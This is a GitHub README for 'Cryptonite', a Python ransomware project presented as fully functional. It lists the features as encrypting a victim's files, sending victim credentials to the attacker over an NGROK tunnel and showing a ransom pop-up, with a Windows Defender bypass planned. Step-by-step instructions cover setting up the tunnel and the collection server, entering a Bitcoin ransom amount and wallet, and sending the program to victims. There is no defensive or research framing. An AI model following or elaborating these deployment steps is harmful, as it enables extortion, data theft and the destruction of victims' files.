![MIT License](https://img.shields.io/github/license/CYBERDEVILZ/CRYPTONITE) ![Issues](https://img.shields.io/github/issues/CYBERDEVILZ/CRYPTONITE?color=cyan) ![](https://img.shields.io/github/languages/top/CYBERDEVILZ/CRYPTONITE)   
![](https://img.shields.io/github/forks/cyberdevilz/cryptonite?style=social) ![](https://img.shields.io/github/stars/CYBERDEVILZ/CRYPTONITE?style=social)

# CRYPTONITE - A ransomware developed using Python

![Cryptonite](https://user-images.githubusercontent.com/55954313/123502409-c500b480-d669-11eb-977b-4e9ac5c327fa.jpg)

## Fully functional ransomware that uses minimum resources to give maximum output

## TASK LIST
- [x] Encrypt all files except system specific ones
- [x] Encrytion must only be decrypted with a special key
- [x] Send the credentials of the victim to the attacker via secure tunnel, preferably NGROK
- [x] Pop up box should appear after encryption asking for ransom
- [x] Create a server to retrieve information sent by the victim
- [x] Add custom extension to encrypted files
- [ ] Create Windows Defender bypass script

---
# SEE CRYPTONITE IN ACTION

https://user-images.githubusercontent.com/55954313/128112200-e2b5a676-6c99-43fd-b5e2-d5d5229e6410.mp4



---

# LEARN TO USE CRYPTONITE   
Cryptonite was developed with a motive of achieving maximum output with minimum efforts. Anyone can learn to use Cryptonite. The below steps will guide you to use Cryptonite properly:-

## 1. SETTING UP FOR THE FIRST TIME

The following setups need to be done if you are using Cryptonite for the first time.

### Create an NGROK account

* Visit [NGROK](https://ngrok.com/)
* Signup for an account. If you can spare some money, then buy the premium version. Else, the free version will suffice.
* Login to [NGROK](https://dashboard.ngrok.com/login)
* Download the suitable release of NGROK for your operating system.

     ![image](https://user-images.githubusercontent.com/55954313/124344516-533be400-dbf0-11eb-9d8f-ff745a510e3e.png)

* Unzip and install NGROK.
  * For Linux / MAC users, unzip the folder via terminal:-   
  
        unzip /path/to/ngrok.zip
  * For Windows users, just unzip the folder and run the exe file   
* Authenticate your NGROK:-   
  * Copy your AUTH TOKEN from [NGROK SETUP PAGE](https://dashboard.ngrok.com/get-started/your-authtoken)
  * For windows users, open cmd and type (replace `YOUR_AUTH_TOKEN_HERE` with your authtoken):-   
     
        ngrok authtoken YOUR_AUTH_TOKEN_HERE
  * For Linux / MAC users, open terminal and type (replace `YOUR_AUTH_TOKEN_HERE` with your authtoken):-   
     
        ./ngrok authtoken YOUR_AUTH_TOKEN_HERE

### Install the Python requirements for Cryptonite

    pip install -r "requirements.txt"  

## 2. FIRING UP THE SERVER!
Run the Server.py file before you send the ransomware to victims. Make sure that the Server runs all the time.
We will be running the Server on port 8000 of our localhost. Hence we need to perform port forwarding using NGROK to receive the credentials of our victims sent by our Ransomware. That will be our next step.

## 3. PORT FORWARDING USING NGROK

* Run NGROK on port 8000:-   
     

[Starting ngrok on 8000](https://user-images.githubusercontent.com/55954313/124347475-a6b72d80-dc02-11eb-9d85-d8e5d0a79f08.mp4)


* Copy the url and add the link [here](https://github.com/CYBERDEVILZ/Cryptonite/blob/89199d0fb04eb682ecd22417bf1de9f0a60e4e69/Cryptonite.py#L17). 
* DO NOT CLOSE THE TERMINAL OR ELSE THE PORT FORWARDING WILL STOP

## 4. FILLING UP THE DETAILS

* Open Cryptonite.py and edit these lines:-   
  * [Bitcoin Amount](https://github.com/CYBERDEVILZ/Cryptonite/blob/89199d0fb04eb682ecd22417bf1de9f0a60e4e69/Cryptonite.py#L18)
  * [Bitcoin Wallet](https://github.com/CYBERDEVILZ/Cryptonite/blob/89199d0fb04eb682ecd22417bf1de9f0a60e4e69/Cryptonite.py#L19)
  * [Email](https://github.com/CYBERDEVILZ/Cryptonite/blob/89199d0fb04eb682ecd22417bf1de9f0a60e4e69/Cryptonite.py#L20)
  
* Save Cryptonite.py

## 5. TEST IT ON YOUR COMPUTER

Believe me when I say this... You can safely test this Ransomware on your device provided you mention the correct path to the folder you are testing on. I have already created a testing folder and the path has also been given. So its easier for you to see for yourself. Just execute cryptonite.py and see the magic happen. If you wish to create your own folder and test it there, then mention the absolute path of the folder here.. [edit path](https://github.com/CYBERDEVILZ/Cryptonite/blob/6f85414d61f546df41840e3a3a45798b5061e3b5/Cryptonite.py#L55)

Points to note...

* When you execute cryptonite.py, go to the server.py terminal and lookout whether you received POST request from your localhost. If yes then the NGROK configuration was successful.
* The decryption key will be shown to the terminal for a moment while the encryption is happening in the backend. I did this, in case you don't have a network connection, then you can directly copy and paste the decryption key into the message box that appears later requesting for a decryption key to decrypt the files. But remember, the decryption key will be shown for a short period of time. So make sure you are quick. If you don't want to show the decryption key, then you can delete the print statement here... [don't show decryption key](https://github.com/CYBERDEVILZ/Cryptonite/blob/6f85414d61f546df41840e3a3a45798b5061e3b5/Cryptonite.py#L17)
* You can retrieve the information about the victims via executing the retrieveinfo.py file. Just type ```python retrieveinfo.py``` inside a new terminal in the current directory.

## 6. SEND IT TO YOUR VICTIMS
Now we need to create an executable of this file and send it to the victim. This part is still under development.

# COMING SOON ... 
